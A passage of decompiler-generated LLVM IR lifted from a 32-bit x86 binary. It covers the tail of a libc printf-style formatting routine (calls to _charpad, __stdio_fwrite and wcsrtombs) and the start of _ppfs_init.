  %v3_80509c6 = add i32 %v2_80509c6, %v6_80509c3
  store i32 %v3_80509c6, i32* @edx, align 4
  br label %dec_label_pc_80509ca

dec_label_pc_80509ca:                             ; preds = %dec_label_pc_80509b6, %dec_label_pc_80509be
  %v0_80509ca = load i32, i32* @esp, align 4
  %v1_80509ca = add i32 %v0_80509ca, 24
  %v2_80509ca = inttoptr i32 %v1_80509ca to i32*
  %v3_80509ca = load i32, i32* %v2_80509ca, align 4
  store i32 %v3_80509ca, i32* %eax.global-to-local, align 4
  %v1_80509ce = add i32 %v0_80509ca, 8
  %v2_80509ce = inttoptr i32 %v1_80509ce to i32*
  store i32 0, i32* %v2_80509ce, align 4
  %v0_80509d6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80509d6 = load i32, i32* @edx, align 4
  %v2_80509d6 = sub i32 %v0_80509d6, %v1_80509d6
  %v7_80509d6 = icmp ult i32 %v0_80509d6, %v1_80509d6
  %v12_80509d6 = icmp eq i32 %v2_80509d6, 0
  %v2_80509d8 = or i1 %v7_80509d6, %v12_80509d6
  br i1 %v2_80509d8, label %dec_label_pc_80509e0, label %dec_label_pc_80509da

dec_label_pc_80509da:                             ; preds = %dec_label_pc_80509ca
  store i32 %v2_80509d6, i32* %eax.global-to-local, align 4
  %v1_80509dc = load i32, i32* @esp, align 4
  %v2_80509dc = add i32 %v1_80509dc, 8
  %v3_80509dc = inttoptr i32 %v2_80509dc to i32*
  store i32 %v2_80509d6, i32* %v3_80509dc, align 4
  %v0_80509e4.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80509e0

dec_label_pc_80509e0:                             ; preds = %dec_label_pc_80509ca, %dec_label_pc_80509da
  %v0_80509e4 = phi i32 [ %v1_80509d6, %dec_label_pc_80509ca ], [ %v0_80509e4.pre, %dec_label_pc_80509da ]
  %v0_80509e0 = load i32, i32* @esp, align 4
  %v1_80509e0 = add i32 %v0_80509e0, 8
  %v2_80509e0 = inttoptr i32 %v1_80509e0 to i32*
  %v3_80509e0 = load i32, i32* %v2_80509e0, align 4
  store i32 %v3_80509e0, i32* @ecx, align 4
  %v2_80509e4 = add i32 %v3_80509e0, %v0_80509e4
  store i32 %v2_80509e4, i32* %eax.global-to-local, align 4
  %v1_80509e7 = inttoptr i32 %v0_80509e0 to i32*
  %v2_80509e7 = load i32, i32* %v1_80509e7, align 4
  %v4_80509e7 = add i32 %v2_80509e7, %v2_80509e4
  store i32 %v4_80509e7, i32* %v1_80509e7, align 4
  %v0_80509ea = load i32, i32* @esp, align 4
  %v1_80509ea = add i32 %v0_80509ea, 7
  %v2_80509ea = inttoptr i32 %v1_80509ea to i8*
  %v3_80509ea = load i8, i8* %v2_80509ea, align 1
  %v9_80509ea = icmp eq i8 %v3_80509ea, 48
  %v1_80509ef = icmp eq i1 %v9_80509ea, false
  br i1 %v1_80509ef, label %dec_label_pc_80509fb, label %dec_label_pc_80509f1

dec_label_pc_80509f1:                             ; preds = %dec_label_pc_80509e0
  %v0_80509f1 = load i32, i32* @ebx, align 4
  %v1_80509f1 = load i32, i32* @ecx, align 4
  %v2_80509f1 = add i32 %v1_80509f1, %v0_80509f1
  store i32 %v2_80509f1, i32* @ebx, align 4
  %v1_80509f3 = add i32 %v0_80509ea, 8
  %v2_80509f3 = inttoptr i32 %v1_80509f3 to i32*
  store i32 0, i32* %v2_80509f3, align 4
  %v0_80509fb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80509fb

dec_label_pc_80509fb:                             ; preds = %dec_label_pc_80509e0, %dec_label_pc_80509f1
  %v0_8050a02 = phi i32 [ %v0_80509ea, %dec_label_pc_80509e0 ], [ %v0_80509fb.pre, %dec_label_pc_80509f1 ]
  %v1_80509fb = add i32 %v0_8050a02, 32
  %v2_80509fb = inttoptr i32 %v1_80509fb to i8*
  %v3_80509fb = load i8, i8* %v2_80509fb, align 1
  %v4_80509fb = and i8 %v3_80509fb, 8
  %v5_80509fb = icmp eq i8 %v4_80509fb, 0
  %v1_8050a00 = icmp eq i1 %v5_80509fb, false
  br i1 %v1_8050a00, label %dec_label_pc_8050a29, label %dec_label_pc_8050a02

dec_label_pc_8050a02:                             ; preds = %dec_label_pc_80509fb
  %v1_8050a02 = add i32 %v0_8050a02, 8
  %v2_8050a02 = inttoptr i32 %v1_8050a02 to i32*
  %v3_8050a02 = load i32, i32* %v2_8050a02, align 4
  store i32 %v3_8050a02, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8050a0b = add i32 %v0_8050a02, 368
  %v2_8050a0b = inttoptr i32 %v1_8050a0b to i32*
  %v3_8050a0b = load i32, i32* %v2_8050a0b, align 4
  store i32 %v3_8050a0b, i32* @eax, align 4
  %v0_8050a12 = call i32 @_charpad()
  store i32 %v0_8050a12, i32* %eax.global-to-local, align 4
  %v1_8050a17 = load i32, i32* @esp, align 4
  %v2_8050a17 = add i32 %v1_8050a17, 8
  %v3_8050a17 = inttoptr i32 %v2_8050a17 to i32*
  %v4_8050a17 = load i32, i32* %v3_8050a17, align 4
  %v15_8050a17 = icmp eq i32 %v0_8050a12, %v4_8050a17
  %v1_8050a1b = icmp eq i1 %v15_8050a17, false
  br i1 %v1_8050a1b, label %dec_label_pc_8050b17, label %dec_label_pc_8050a21

dec_label_pc_8050a21:                             ; preds = %dec_label_pc_8050a02
  store i32 0, i32* %v3_8050a17, align 4
  %v1_8050a29.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050a29

dec_label_pc_8050a29:                             ; preds = %dec_label_pc_80509fb, %dec_label_pc_8050a21
  %v1_8050a29 = phi i32 [ %v0_8050a02, %dec_label_pc_80509fb ], [ %v1_8050a29.pre, %dec_label_pc_8050a21 ]
  %v0_8050a29 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050a29 = add i32 %v1_8050a29, -4
  %v3_8050a29 = inttoptr i32 %v2_8050a29 to i32*
  store i32 %v0_8050a29, i32* %v3_8050a29, align 4
  %v0_8050a2a = load i32, i32* %eax.global-to-local, align 4
  %v2_8050a2a = add i32 %v1_8050a29, -8
  %v3_8050a2a = inttoptr i32 %v2_8050a2a to i32*
  store i32 %v0_8050a2a, i32* %v3_8050a2a, align 4
  %v1_8050a2b = add i32 %v1_8050a29, 368
  %v2_8050a2b = inttoptr i32 %v1_8050a2b to i32*
  %v3_8050a2b = load i32, i32* %v2_8050a2b, align 4
  %v5_8050a2b = add i32 %v1_8050a29, -12
  %v6_8050a2b = inttoptr i32 %v5_8050a2b to i32*
  store i32 %v3_8050a2b, i32* %v6_8050a2b, align 4
  %v0_8050a32 = load i32, i32* @ebp, align 4
  %v1_8050a32 = add i32 %v0_8050a32, ptrtoint (i32* @global_var_805fca5.710 to i32)
  store i32 %v1_8050a32, i32* %eax.global-to-local, align 4
  %v2_8050a38 = add i32 %v1_8050a29, -16
  %v3_8050a38 = inttoptr i32 %v2_8050a38 to i32*
  store i32 %v1_8050a32, i32* %v3_8050a38, align 4
  %v0_8050a39 = load i32, i32* %stack_var_-364, align 4
  %v4_8050a39 = inttoptr i32 %v0_8050a39 to i8*
  %v5_8050a39 = call i32 @__GI_fputs_unlocked(i8* %v4_8050a39, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8050a39, i32* %eax.global-to-local, align 4
  %v0_8050a3e = load i32, i32* @esp, align 4
  %v1_8050a3e = add i32 %v0_8050a3e, 384
  %v2_8050a3e = inttoptr i32 %v1_8050a3e to i32*
  %v3_8050a3e = load i32, i32* %v2_8050a3e, align 4
  store i32 %v3_8050a3e, i32* @eax, align 4
  %v0_8050a45 = load i32, i32* @ebx, align 4
  store i32 %v0_8050a45, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_8050a4c = call i32 @_charpad()
  store i32 %v0_8050a4c, i32* %eax.global-to-local, align 4
  %v0_8050a51 = load i32, i32* @esp, align 4
  %v1_8050a51 = add i32 %v0_8050a51, 16
  %v1_8050a54 = load i32, i32* @ebx, align 4
  %v12_8050a54 = icmp eq i32 %v0_8050a4c, %v1_8050a54
  %v1_8050a56 = icmp eq i1 %v12_8050a54, false
  br i1 %v1_8050a56, label %dec_label_pc_8050b17, label %dec_label_pc_8050a5c

dec_label_pc_8050a5c:                             ; preds = %dec_label_pc_8050a29
  %v1_8050a5c = add i32 %v0_8050a51, 356
  %v2_8050a5c = inttoptr i32 %v1_8050a5c to i32*
  %v3_8050a5c = load i32, i32* %v2_8050a5c, align 4
  %v4_8050a5c = icmp eq i32 %v3_8050a5c, 0
  %v1_8050a64 = icmp eq i1 %v4_8050a5c, false
  br i1 %v1_8050a64, label %dec_label_pc_8050a88, label %dec_label_pc_8050a66

dec_label_pc_8050a66:                             ; preds = %dec_label_pc_8050a5c
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050a68 = load i32, i32* @esi, align 4
  %v1_8050a68 = icmp eq i32 %v0_8050a68, 0
  br i1 %v1_8050a68, label %dec_label_pc_8050a7e.thread, label %dec_label_pc_8050a7e

dec_label_pc_8050a7e.thread:                      ; preds = %dec_label_pc_8050a66
  br label %dec_label_pc_8050ae9

dec_label_pc_8050a7e:                             ; preds = %dec_label_pc_8050a66
  %v2_8050a6c = add i32 %v0_8050a51, 12
  %v3_8050a6c = inttoptr i32 %v2_8050a6c to i32*
  store i32 0, i32* %v3_8050a6c, align 4
  %v1_8050a6d = add i32 %v0_8050a51, 384
  %v2_8050a6d = inttoptr i32 %v1_8050a6d to i32*
  %v3_8050a6d = load i32, i32* %v2_8050a6d, align 4
  %v5_8050a6d = add i32 %v0_8050a51, 8
  %v6_8050a6d = inttoptr i32 %v5_8050a6d to i32*
  store i32 %v3_8050a6d, i32* %v6_8050a6d, align 4
  %v0_8050a74 = load i32, i32* @esi, align 4
  %v2_8050a74 = add i32 %v0_8050a51, 4
  %v3_8050a74 = inttoptr i32 %v2_8050a74 to i32*
  store i32 %v0_8050a74, i32* %v3_8050a74, align 4
  %v0_8050a75 = load i32, i32* @edi, align 4
  %v3_8050a75 = inttoptr i32 %v0_8050a51 to i32*
  store i32 %v0_8050a75, i32* %v3_8050a75, align 4
  %v0_8050a76 = load i32, i32* %stack_var_-364, align 4
  %v4_8050a76 = call i32 @__stdio_fwrite(i32 %v0_8050a76, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050a76, i32* %eax.global-to-local, align 4
  %v0_8050a7b = load i32, i32* @esp, align 4
  %v1_8050a7b = add i32 %v0_8050a7b, 16
  %v1_8050a7e.pre = load i32, i32* @esi, align 4
  %v12_8050a7e = icmp eq i32 %v4_8050a76, %v1_8050a7e.pre
  %v1_8050a80 = icmp eq i1 %v12_8050a7e, false
  br i1 %v1_8050a80, label %dec_label_pc_8050b17, label %dec_label_pc_8050ae9

dec_label_pc_8050a88:                             ; preds = %dec_label_pc_8050a5c
  %v1_8050a88 = add i32 %v0_8050a51, 348
  %v2_8050a88 = inttoptr i32 %v1_8050a88 to i32*
  store i32 0, i32* %v2_8050a88, align 4
  %v0_8050ae58 = load i32, i32* @esi, align 4
  %v1_8050ae59 = icmp eq i32 %v0_8050ae58, 0
  %v1_8050ae716 = icmp eq i1 %v1_8050ae59, false
  br i1 %v1_8050ae716, label %dec_label_pc_8050a95, label %dec_label_pc_8050a88.dec_label_pc_8050ae9.loopexit_crit_edge

dec_label_pc_8050a88.dec_label_pc_8050ae9.loopexit_crit_edge: ; preds = %dec_label_pc_8050a88
  %v0_8050ae9.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050ae9

dec_label_pc_8050a95:                             ; preds = %dec_label_pc_8050a88, %dec_label_pc_8050ae3
  %v0_8050a95 = phi i32 [ %v2_8050ae3, %dec_label_pc_8050ae3 ], [ %v0_8050ae58, %dec_label_pc_8050a88 ]
  %tmp103 = icmp ult i32 %v0_8050a95, 129
  br i1 %tmp103, label %dec_label_pc_8050aa4, label %dec_label_pc_8050a9f

dec_label_pc_8050a9f:                             ; preds = %dec_label_pc_8050a95
  br label %dec_label_pc_8050aa4

dec_label_pc_8050aa4:                             ; preds = %dec_label_pc_8050a95, %dec_label_pc_8050a9f
  %storemerge104 = phi i32 [ 128, %dec_label_pc_8050a9f ], [ %v0_8050a95, %dec_label_pc_8050a95 ]
  store i32 %storemerge104, i32* %edx.global-to-local, align 4
  %v0_8050aa4 = load i32, i32* @esp, align 4
  %v1_8050aa4 = add i32 %v0_8050aa4, 332
  %v2_8050aab = add i32 %v0_8050aa4, -4
  %v3_8050aab = inttoptr i32 %v2_8050aab to i32*
  store i32 %v1_8050aa4, i32* %v3_8050aab, align 4
  %v0_8050aac = load i32, i32* %edx.global-to-local, align 4
  %v2_8050aac = add i32 %v0_8050aa4, -8
  %v3_8050aac = inttoptr i32 %v2_8050aac to i32*
  store i32 %v0_8050aac, i32* %v3_8050aac, align 4
  %v1_8050aad = add i32 %v0_8050aa4, 340
  store i32 %v1_8050aad, i32* %eax.global-to-local, align 4
  %v2_8050ab4 = add i32 %v0_8050aa4, -12
  %v3_8050ab4 = inttoptr i32 %v2_8050ab4 to i32*
  store i32 %v1_8050aad, i32* %v3_8050ab4, align 4
  %v1_8050ab5 = add i32 %v0_8050aa4, 204
  store i32 %v1_8050ab5, i32* @edi, align 4
  %v2_8050abc = add i32 %v0_8050aa4, -16
  %v3_8050abc = inttoptr i32 %v2_8050abc to i32*
  store i32 %v1_8050ab5, i32* %v3_8050abc, align 4
  %v0_8050abd = call i32 @__GI_wcsrtombs()
  store i32 %v0_8050abd, i32* @ebx, align 4
  %v0_8050ac4 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8050ac9 = icmp eq i32 %v0_8050abd, 0
  br i1 %v1_8050ac9, label %dec_label_pc_8050adf, label %dec_label_pc_8050acd

dec_label_pc_8050acd:                             ; preds = %dec_label_pc_8050aa4
  %v0_8050acd = load i32, i32* @ebp, align 4
  %v2_8050acd = add i32 %v0_8050ac4, 12
  %v3_8050acd = inttoptr i32 %v2_8050acd to i32*
  store i32 %v0_8050acd, i32* %v3_8050acd, align 4
  %v1_8050ace = add i32 %v0_8050ac4, 384
  %v2_8050ace = inttoptr i32 %v1_8050ace to i32*
  %v3_8050ace = load i32, i32* %v2_8050ace, align 4
  %v5_8050ace = add i32 %v0_8050ac4, 8
  %v6_8050ace = inttoptr i32 %v5_8050ace to i32*
  store i32 %v3_8050ace, i32* %v6_8050ace, align 4
  %v2_8050ad5 = add i32 %v0_8050ac4, 4
  %v3_8050ad5 = inttoptr i32 %v2_8050ad5 to i32*
  store i32 %v0_8050abd, i32* %v3_8050ad5, align 4
  %v0_8050ad6 = load i32, i32* @edi, align 4
  %v3_8050ad6 = inttoptr i32 %v0_8050ac4 to i32*
  store i32 %v0_8050ad6, i32* %v3_8050ad6, align 4
  %v0_8050ad7 = load i32, i32* %stack_var_-364, align 4
  %v4_8050ad7 = call i32 @__stdio_fwrite(i32 %v0_8050ad7, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050ad7, i32* %eax.global-to-local, align 4
  %v0_8050adc = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050adf

dec_label_pc_8050adf:                             ; preds = %dec_label_pc_8050aa4, %dec_label_pc_8050acd
  %v0_8050b1750.in = phi i32 [ %v0_8050ac4, %dec_label_pc_8050aa4 ], [ %v0_8050adc, %dec_label_pc_8050acd ]
  %v1_8050ae3 = phi i32 [ 0, %dec_label_pc_8050aa4 ], [ %v4_8050ad7, %dec_label_pc_8050acd ]
  %v0_8050b1750 = add i32 %v0_8050b1750.in, 16
  %v12_8050adf = icmp eq i32 %v1_8050ae3, %v0_8050abd
  %v1_8050ae1 = icmp eq i1 %v12_8050adf, false
  br i1 %v1_8050ae1, label %dec_label_pc_8050b17, label %dec_label_pc_8050ae3

dec_label_pc_8050ae3:                             ; preds = %dec_label_pc_8050adf
  %v0_8050ae3 = load i32, i32* @esi, align 4
  %v2_8050ae3 = sub i32 %v0_8050ae3, %v1_8050ae3
  %v12_8050ae3 = icmp eq i32 %v2_8050ae3, 0
  store i32 %v2_8050ae3, i32* @esi, align 4
  %v1_8050ae7 = icmp eq i1 %v12_8050ae3, false
  br i1 %v1_8050ae7, label %dec_label_pc_8050a95, label %dec_label_pc_8050ae9

dec_label_pc_8050ae9:                             ; preds = %dec_label_pc_8050ae3, %dec_label_pc_8050a7e.thread, %dec_label_pc_8050a88.dec_label_pc_8050ae9.loopexit_crit_edge, %dec_label_pc_8050a7e
  %v0_8050ae9 = phi i32 [ %v1_8050a7b, %dec_label_pc_8050a7e ], [ %v0_8050ae9.pre.pre, %dec_label_pc_8050a88.dec_label_pc_8050ae9.loopexit_crit_edge ], [ %v1_8050a51, %dec_label_pc_8050a7e.thread ], [ %v0_8050b1750, %dec_label_pc_8050ae3 ]
  %v1_8050ae9 = add i32 %v0_8050ae9, 8
  %v2_8050ae9 = inttoptr i32 %v1_8050ae9 to i32*
  %v3_8050ae9 = load i32, i32* %v2_8050ae9, align 4
  store i32 %v3_8050ae9, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8050af2 = add i32 %v0_8050ae9, 368
  %v2_8050af2 = inttoptr i32 %v1_8050af2 to i32*
  %v3_8050af2 = load i32, i32* %v2_8050af2, align 4
  store i32 %v3_8050af2, i32* @eax, align 4
  %v0_8050af9 = call i32 @_charpad()
  store i32 %v0_8050af9, i32* %eax.global-to-local, align 4
  %v1_8050afe = load i32, i32* @esp, align 4
  %v2_8050afe = add i32 %v1_8050afe, 8
  %v3_8050afe = inttoptr i32 %v2_8050afe to i32*
  %v4_8050afe = load i32, i32* %v3_8050afe, align 4
  %v15_8050afe = icmp eq i32 %v0_8050af9, %v4_8050afe
  %v1_8050b02 = icmp eq i1 %v15_8050afe, false
  br i1 %v1_8050b02, label %dec_label_pc_8050b17, label %dec_label_pc_8050b04

dec_label_pc_8050b04:                             ; preds = %dec_label_pc_8050ae9, %dec_label_pc_805087e, %dec_label_pc_80506ac
  %v0_8050b04 = phi i32 [ %v1_8050afe, %dec_label_pc_8050ae9 ], [ %v0_8050b04.pre, %dec_label_pc_805087e ], [ %v1_80506ca, %dec_label_pc_80506ac ]
  %v1_8050b04 = add i32 %v0_8050b04, 16
  %v2_8050b04 = inttoptr i32 %v1_8050b04 to i32*
  %v3_8050b04 = load i32, i32* %v2_8050b04, align 4
  store i32 %v3_8050b04, i32* @ebx, align 4
  store i32 %v3_8050b04, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050604.backedge

dec_label_pc_8050b0f:                             ; preds = %dec_label_pc_8050642
  %v1_8050b0f = add i32 %v0_8050b0f, 2
  store i32 %v1_8050b0f, i32* @ebx, align 4
  br label %dec_label_pc_8050604.backedge

dec_label_pc_8050b17:                             ; preds = %dec_label_pc_805062e, %dec_label_pc_8050a7e, %dec_label_pc_8050a29, %dec_label_pc_8050a02, %dec_label_pc_8050972, %dec_label_pc_80508ed, %dec_label_pc_80508c1, %dec_label_pc_8050855, %dec_label_pc_8050ae9, %dec_label_pc_8050adf
  %v0_8050b17 = phi i32 [ %v0_8050b1750, %dec_label_pc_8050adf ], [ %v0_8050b17.pre.pre, %dec_label_pc_805062e ], [ %v1_8050a7b, %dec_label_pc_8050a7e ], [ %v1_8050a51, %dec_label_pc_8050a29 ], [ %v1_8050a17, %dec_label_pc_8050a02 ], [ %v0_80506a4.lcssa, %dec_label_pc_8050972 ], [ %v1_8050905, %dec_label_pc_80508ed ], [ %v1_80508d8, %dec_label_pc_80508c1 ], [ %v1_8050873, %dec_label_pc_8050855 ], [ %v1_8050afe, %dec_label_pc_8050ae9 ]
  %v1_8050b17 = inttoptr i32 %v0_8050b17 to i32*
  store i32 -1, i32* %v1_8050b17, align 4
  br label %dec_label_pc_8050b1e

dec_label_pc_8050b1e:                             ; preds = %dec_label_pc_8050639, %dec_label_pc_80505a7, %dec_label_pc_80505c6, %dec_label_pc_8050b17
  %v0_8050b1e = load i32, i32* @esp, align 4
  %v1_8050b1e = inttoptr i32 %v0_8050b1e to i32*
  %v2_8050b1e = load i32, i32* %v1_8050b1e, align 4
  store i32 %v2_8050b1e, i32* %eax.global-to-local, align 4
  %v1_8050b21 = add i32 %v0_8050b1e, 348
  %v1_8050b27 = inttoptr i32 %v1_8050b21 to i32*
  %v2_8050b27 = load i32, i32* %v1_8050b27, align 4
  store i32 %v2_8050b27, i32* @ebx, align 4
  ret i32 %v2_8050b1e

; uselistorder directives
  uselistorder i32 %v1_8050b0f, { 1, 0 }
  uselistorder i32 %v3_8050b04, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8050ae9, { 1, 0 }
  uselistorder i32 %v2_8050ae3, { 1, 2, 0 }
  uselistorder i32 %v0_8050b1750, { 1, 0 }
  uselistorder i32 %v1_8050ae3, { 1, 0 }
  uselistorder i32 %v0_8050ac4, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_8050a51, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_8050a29, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8050a02, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80509d6, { 1, 0, 2 }
  uselistorder i32 %v6_80509c3, { 1, 0 }
  uselistorder i32 %v1_80509c0, { 1, 0 }
  uselistorder i32 %v0_80509b9, { 0, 3, 2, 1 }
  uselistorder i32 %v1_8050943, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_8050953, { 2, 3, 1, 0 }
  uselistorder i32 %v0_80508b4, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_805089a, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_8050833, { 1, 0, 2 }
  uselistorder i32 %v1_80507b7, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_805080a, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_8050793, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805074c, { 1, 0 }
  uselistorder i32 %v1_8050759, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_80506a4, { 3, 10, 13, 5, 4, 7, 6, 8, 11, 0, 1, 2, 12, 9, 14, 15 }
  uselistorder i32 %v0_80506a4.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_80506a0, { 1, 0 }
  uselistorder i32 %v1_80506a0.pre, { 1, 0 }
  uselistorder i32 %v1_805069f, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_805069c, { 1, 0 }
  uselistorder i32 %v2_80506a081, { 1, 0 }
  uselistorder i32 %v3_8050686, { 1, 0 }
  uselistorder i32 %v1_8050642, { 0, 2, 3, 1 }
  uselistorder i32 %v2_805060e, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050612, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80505fc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 6, 5, 7, 2, 3, 1, 0, 4, 8, 9, 10 }
  uselistorder i32* %edx.global-to-local, { 31, 2, 0, 3, 24, 4, 1, 5, 9, 6, 7, 8, 10, 11, 12, 13, 15, 14, 17, 16, 18, 19, 25, 20, 21, 22, 26, 23, 27, 28, 30, 29 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 57, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 9, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 52, 51, 53, 54, 55, 56 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 0, 1, 2, 6, 5, 4, 3, 7, 8, 9, 10 }
  uselistorder i32 204, { 2, 0, 3, 1, 4 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_8050b1e, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8050b17, { 8, 9, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_8050ae9, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8050adf, { 1, 0 }
  uselistorder label %dec_label_pc_8050aa4, { 1, 0 }
  uselistorder label %dec_label_pc_8050a95, { 1, 0 }
  uselistorder label %dec_label_pc_8050a29, { 1, 0 }
  uselistorder label %dec_label_pc_80509fb, { 1, 0 }
  uselistorder label %dec_label_pc_80509e0, { 1, 0 }
  uselistorder label %dec_label_pc_80509ca, { 1, 0 }
  uselistorder label %dec_label_pc_80509b6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80509aa, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050943, { 1, 0 }
  uselistorder label %dec_label_pc_8050936, { 1, 0 }
  uselistorder label %dec_label_pc_80508c1, { 1, 0 }
  uselistorder label %dec_label_pc_8050855, { 1, 0 }
  uselistorder label %dec_label_pc_805080a, { 1, 0 }
  uselistorder label %dec_label_pc_80507fb, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_80507c1, { 1, 0 }
  uselistorder label %dec_label_pc_80507a8, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8050759, { 1, 0 }
  uselistorder label %dec_label_pc_8050740, { 1, 0 }
  uselistorder label %dec_label_pc_805072c, { 1, 0 }
  uselistorder label %dec_label_pc_8050727, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050708, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050695, { 1, 0 }
  uselistorder label %dec_label_pc_805068d, { 1, 0 }
  uselistorder label %dec_label_pc_8050639, { 1, 0 }
  uselistorder label %dec_label_pc_805062e, { 1, 0 }
  uselistorder label %dec_label_pc_8050604.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050b2c = load i32, i32* @esi, align 4
  %v0_8050b2d = load i32, i32* @ebx, align 4
  store i32 %v0_8050b2d, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_8050b41 = bitcast i32* %arg1 to i8*
  %v4_8050b41 = call i32 @__GI_memset(i8* %v3_8050b41, i32 0, i32 188)
  store i32 %v4_8050b41, i32* %eax.global-to-local, align 4
  %v0_8050b46 = load i32, i32* @ebx, align 4
  %v1_8050b46 = add i32 %v0_8050b46, 24
  %v2_8050b46 = inttoptr i32 %v1_8050b46 to i32*
  %v3_8050b46 = load i32, i32* %v2_8050b46, align 4
  %v4_8050b46 = add i32 %v3_8050b46, -1
  store i32 %v4_8050b46, i32* %v2_8050b46, align 4
  %v0_8050b49 = load i32, i32* @esi, align 4
  %v1_8050b49 = load i32, i32* @ebx, align 4
  %v2_8050b49 = inttoptr i32 %v1_8050b49 to i32*
  store i32 %v0_8050b49, i32* %v2_8050b49, align 4
  %v0_8050b4b = load i32, i32* @ebx, align 4
  %v1_8050b4b = add i32 %v0_8050b4b, 40
  store i32 %v1_8050b4b, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050b56

dec_label_pc_8050b56:                             ; preds = %dec_label_pc_8050b56, %entry
  %v0_8050b56 = phi i32 [ %v1_8050b5c, %dec_label_pc_8050b56 ], [ %v1_8050b4b, %entry ]
  %v1_8050b56 = inttoptr i32 %v0_8050b56 to i32*
  store i32 8, i32* %v1_8050b56, align 4
  %v0_8050b5c = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b5c = add i32 %v0_8050b5c, 4
  store i32 %v1_8050b5c, i32* %eax.global-to-local, align 4
  %v0_8050b5f = load i32, i32* %edx.global-to-local, align 4
  %v1_8050b5f = add i32 %v0_8050b5f, -1
  %v8_8050b5f = icmp eq i32 %v1_8050b5f, 0
  store i32 %v1_8050b5f, i32* %edx.global-to-local, align 4
  %v1_8050b60 = icmp eq i1 %v8_8050b5f, false
  br i1 %v1_8050b60, label %dec_label_pc_8050b56, label %dec_label_pc_8050b62

dec_label_pc_8050b62:                             ; preds = %dec_label_pc_8050b56
  %v0_8050b62 = load i32, i32* @esi, align 4
  store i32 %v0_8050b62, i32* %eax.global-to-local, align 4
  %v1_8050b8d20 = inttoptr i32 %v0_8050b62 to i8*
  %v2_8050b8d21 = load i8, i8* %v1_8050b8d20, align 1
  %v3_8050b8d22 = zext i8 %v2_8050b8d21 to i32
  %v5_8050b8d23 = and i32 %v1_8050b5f, -256
  %v6_8050b8d24 = or i32 %v3_8050b8d22, %v5_8050b8d23
  store i32 %v6_8050b8d24, i32* %edx.global-to-local, align 4
  %v4_8050b8f25 = icmp eq i8 %v2_8050b8d21, 0
  %v1_8050b9126 = icmp eq i1 %v4_8050b8f25, false
